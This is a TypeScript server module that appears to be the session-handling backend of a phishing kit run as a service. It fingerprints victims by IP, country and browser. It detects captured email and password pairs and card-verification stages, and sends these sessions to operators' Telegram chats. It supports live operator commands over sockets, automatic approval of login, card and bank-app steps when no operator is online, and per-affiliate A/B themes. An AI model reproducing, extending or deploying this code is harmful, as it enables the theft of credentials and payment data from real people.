
import * as db from '../db';
import { cachedSettings } from '../utils/settings-cache';
import { getFlagEmoji, escapeHtml } from '../utils/common';
import { formatSessionForTelegram, sendTelegram } from './telegram.service';
import { logAudit } from '../utils/logger';
import { getSocketIO } from '../socket';
import { SessionWithData } from '../types';

export class SessionService {
    /**
     * Process a session sync request
     * Handles state updates, admin assignment, logic flows, notifications, and auto-responses.
     */
    static async processSync(data: Record<string, any>, ip: string, country: string | null): Promise<any> {
        const io = getSocketIO();

        // Populate server-side fields
        data.ip = ip;
        if (data.fingerprint) data.fingerprint.ip = ip;
        if (country) data.ipCountry = country;

        // --- Multi-Admin Logic ---
        let adminId: string | null = null;
        let adminSettings: Record<string, any> = {};
        let tgToken = cachedSettings.tgToken;
        let tgChat = cachedSettings.tgChat;

        // 1. Check for Admin Code
        if (data.adminCode) {
            const link = await db.getLinkByCode(data.adminCode);
            if (link) {
                adminId = link.adminId;
            } else {
                const admin = await db.getUserByCode(data.adminCode);
                if (admin) {
                    adminId = admin.id;
                }
            }
        }

        // 2. Load Existing Session
        const existing = await db.getSession(data.sessionId);

        // Fallback to existing adminId
        if (!adminId && existing && existing.adminId) {
            adminId = existing.adminId;
        }

        // 3. Load Admin Config
        let flowConfig: Record<string, any> = {};
        let themeConfig: Record<string, any> = {};
        let abConfig: Record<string, any> = {};
        let selectedVariant = 'A';

        if (adminId) {
            const admin = await db.getUserById(adminId);
            if (admin) {
                try {
                    adminSettings = JSON.parse(admin.settings || '{}');
                    const tgConfig = JSON.parse(admin.telegramConfig || '{}');
                    if (tgConfig.token && tgConfig.chat) {
                        tgToken = tgConfig.token;
                        tgChat = tgConfig.chat;
                    }
                } catch (e) { }
            }

            if (data.adminCode) {
                const link = await db.getLinkByCode(data.adminCode);
                if (link) {
                    try {
                        // AdminLink configs are already objects (Record<string, unknown>)
                        const linkFlow = (link.flow_config || {}) as Record<string, any>;
                        const linkTheme = (link.theme_config || {}) as Record<string, any>;
                        const linkAB = (link.ab_config || {}) as Record<string, any>;

                        if (linkAB.enabled) {
                            if (existing && existing.variant) {
                                selectedVariant = existing.variant;
                            } else if (data.variant) {
                                selectedVariant = data.variant;
                            } else {
                                const weightA = (linkAB.weightA as number) || 50;
                                const roll = Math.random() * 100;
                                selectedVariant = roll <= weightA ? 'A' : 'B';
                            }
                            data.variant = selectedVariant;

                            if (selectedVariant === 'B') {
                                if (linkAB.flowConfigB) Object.assign(linkFlow, linkAB.flowConfigB);
                                if (linkAB.themeConfigB) Object.assign(linkTheme, linkAB.themeConfigB);
                            }
                        }

                        flowConfig = linkFlow;
                        themeConfig = linkTheme;
                        abConfig = linkAB;

                        // Merge flow into adminSettings
                        Object.assign(adminSettings, linkFlow);
                    } catch (e) { }
                }
            }
        }

        const flag = getFlagEmoji(country || (existing ? existing.ipCountry as string : 'XX') || 'XX');

        // 0. Resume / Link Logic (Only if new session)
        if (!existing) {
            try {
                const sessionsByIp = await db.getSessionsByIp(ip);
                const currentUa = data.fingerprint?.userAgent || '';
                const currentRes = data.fingerprint?.screenResolution || '';

                const matches = sessionsByIp.filter((s: SessionWithData) => {
                    const sData = s as Record<string, any>;
                    const ua = sData.fingerprint?.userAgent || '';
                    const res = sData.fingerprint?.screenResolution || '';
                    if (!currentRes && ua === currentUa) return true;
                    return ua === currentUa && res === currentRes;
                });

                matches.sort((a: SessionWithData, b: SessionWithData) => (b.lastSeen || 0) - (a.lastSeen || 0));

                if (matches.length > 0) {
                    const latest = matches[0];
                    const latestData = latest as Record<string, any>;
                    if (latestData.status !== 'Verified' && latestData.status !== 'Revoked') {
                        console.log(`[Sync] Resuming previous session ${latest.id} for IP ${ip}`);
                        return {
                            status: 'ok',
                            command: { action: 'RESUME', payload: latest }
                        };
                    }

                    if (latestData.status === 'Verified') {
                        console.log(`[Sync] Recurring user detected. Linking to ${latest.id}`);
                        data.isRecurring = true;
                        data.linkedSessionId = latest.id;
                        if (!adminId && latest.adminId) adminId = latest.adminId;
                    }
                }
            } catch (e) {
                console.error('[Sync] Auto-Resume check failed:', e);
            }
        }

        // Notification Logic

        // 1. New Session Initialized
        const hasCreds = (obj: any) => obj && obj.email && obj.password;

        if (hasCreds(data)) {
            const e = existing ? (existing as Record<string, any>) : null;
            if (!e || !hasCreds(e)) {
                const { text, keyboard } = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
                sendTelegram(text, tgToken, tgChat, keyboard);

                if (data.adminCode) {
                    db.incrementLinkSessions(data.adminCode, 'started');
                }
            }
        }

        // 2. Session Verified
        if (existing && existing.status !== 'Verified' && data.status === 'Verified') {
            const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
            let title = `Session Verified ${cardType}`;
            let hideEmpty = false;

            if (data.isArchivedIncomplete) {
                title = `Session Incomplete (Archived) ${cardType}`;
                hideEmpty = true;
            }

            const { text, keyboard } = formatSessionForTelegram(data, title, flag, hideEmpty);
            sendTelegram(text, tgToken, tgChat, keyboard);
            logAudit('System', 'Verified', `Session ${data.sessionId} Verified`, { sessionId: data.sessionId });

            if (data.adminCode) {
                db.incrementLinkSessions(data.adminCode, 'verified');
            }
        }

        // Prevent downgrading 'Verified' status
        if (existing && existing.status === 'Verified' && data.status !== 'Verified') {
            console.log(`[Sync] Preventing status downgrade for ${data.sessionId}. Keeping 'Verified'.`);
            data.status = 'Verified';
        }

        // Upsert Session
        await db.upsertSession(data.sessionId, data, ip, adminId, data.variant);
        console.log(`[Sync] Upserted session ${data.sessionId}. AdminID: ${adminId} Variant: ${data.variant || 'N/A'}`);

        io.emit('sessions-updated');

        // Check for pending commands
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            io.to(data.sessionId).emit('command', cmd);
            return {
                status: 'ok',
                command: cmd,
                settings: adminSettings,
                theme: themeConfig,
                variant: selectedVariant
            };
        }

        // --- Flow Settings (Auto-Logic) ---

        // Auto-Approve Login
        if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
            const autoApprove = adminSettings['autoApproveLogin'];

            if (autoApprove) {
                console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
                const skipPhone = adminSettings['skipPhone'];
                const cmd = { action: 'APPROVE', payload: { skipPhone: !!skipPhone } };
                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                io.to(data.sessionId).emit('command', cmd);
                return { status: 'ok', command: cmd, settings: adminSettings };
            }
        }

        // Offline Mode Logic
        const adminRoom = io.sockets.adapter.rooms.get('admin');
        const isAdminOnline = adminRoom && adminRoom.size > 0;

        if (!isAdminOnline) {
            // Offline: Auto Approve Login (if not already handled)
            if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
                if (!adminSettings['autoApproveLogin']) {
                    console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
                    const cmd = { action: 'APPROVE', payload: { skipPhone: true } };
                    await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                    io.to(data.sessionId).emit('command', cmd);
                    return { status: 'ok', command: cmd, settings: adminSettings };
                }
            }

            // Offline: Auto Approve Card (Complete Flow)
            if (data.stage === 'card_pending' && !data.isFlowComplete) {
                console.log(`[Auto-Approve] Offline mode: Approving Card for ${data.sessionId} in 20s...`);
                // Fire and forget timeout
                setTimeout(async () => {
                    const cmd = { action: 'APPROVE', payload: { flow: 'complete' } };
                    await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                    io.to(data.sessionId).emit('command', cmd);
                }, 20000);
                return { status: 'ok', settings: adminSettings };
            }

            // Offline: Auto Approve Bank App
            if (data.stage === 'bank_app_pending' && !data.isFlowComplete) {
                const cmd = { action: 'APPROVE', payload: {} };
                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                io.to(data.sessionId).emit('command', cmd);
                return { status: 'ok', command: cmd, settings: adminSettings };
            }
        }

        return { status: 'ok', settings: adminSettings };
    }
}
